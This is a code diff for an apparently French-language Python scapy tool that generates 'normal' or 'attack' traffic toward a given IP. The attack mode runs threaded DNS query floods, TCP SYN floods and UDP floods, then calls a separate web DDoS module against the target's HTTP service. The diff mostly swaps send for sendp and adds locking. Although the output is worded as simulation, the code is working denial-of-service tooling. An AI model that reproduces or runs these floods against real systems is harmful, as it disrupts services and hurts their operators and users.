@@ -2,13 +2,13 @@ import time
 import random
 import threading
 from multiprocessing import Process, Manager
-from scapy.all import IP, TCP, UDP, ICMP, DNS, send, DNSQR
-from web_ddos import launch_web_ddos
+from scapy.all import IP, TCP, UDP, ICMP, DNS, sendp, DNSQR, conf
 
+conf.verb = 0
 attack_threads = []
 start_time = 0
 
-def generate_traffic(destination_ip, destination_port, packet_count, packets_per_second):
+def generate_traffic(destination_ip, destination_port, packet_count, packets_per_second, lock):
     while True:
         protocols = ["TCP", "UDP", "ICMP"]
         print("Generation de traffic normal...")
@@ -24,8 +24,8 @@ def generate_traffic(destination_ip, destination_port, packet_count, packets_per
             elif protocol == "ICMP":
                 packet = IP(src=src_ip, dst=destination_ip) / ICMP()
 
-            send(packet, verbose=0)
-            with packets_per_second.get_lock():
+            sendp(packet)
+            with lock:
                 packets_per_second.value += 1
             time.sleep(0.001)
         time.sleep(3)
@@ -41,7 +41,7 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
                 query_name = destination_ip  # Remplacez par le nom de domaine cible
 
                 packet = IP(src=src_ip, dst=destination_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name))
-                send(packet, verbose=0)
+                sendp(packet)
 
                 with lock:
                     packets_per_second.value += 1
@@ -53,7 +53,7 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
                 src_port = random.randint(1024, 65535)
 
                 packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port, flags="S")
-                send(packet, verbose=0)
+                sendp(packet)
 
                 with lock:
                     packets_per_second.value += 1
@@ -66,12 +66,10 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
                 src_port = random.randint(1024, 65535)
 
                 packet = IP(src=src_ip, dst=destination_ip) / UDP(sport=src_port, dport=destination_port)
-                send(packet, verbose=0)
+                sendp(packet)
 
                 with lock:
                     packets_per_second.value += 1
-
-    
 
     # Ajoutez les fonctions d'attaque spécifiques à la liste des threads
     attack_threads.append(threading.Thread(target=dns_attack))
@@ -82,7 +80,8 @@ def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack
     for thread in attack_threads:
         thread.start()
     
-    launch_web_ddos(f"http://{destination_ip}", packets_per_second, lock)
+    import web_ddos
+    web_ddos.launch_web_ddos(f"http://{destination_ip}")
 
 def print_statistics(packets_per_second, lock):
     global start_time
@@ -105,7 +104,7 @@ if __name__ == "__main__":
         lock = manager.Lock()
         if traffic_type.lower() == 'normal':
             print("\nSimulating normal traffic...")
-            normal_process = Process(target=generate_traffic, args=(destination_ip, destination_port, normal_traffic_count, packets_per_second,))
+            normal_process = Process(target=generate_traffic, args=(destination_ip, destination_port, normal_traffic_count, packets_per_second, lock,))
             normal_process.start()
         elif traffic_type.lower() == 'attack':
             print("\nSimulating attack traffic...")
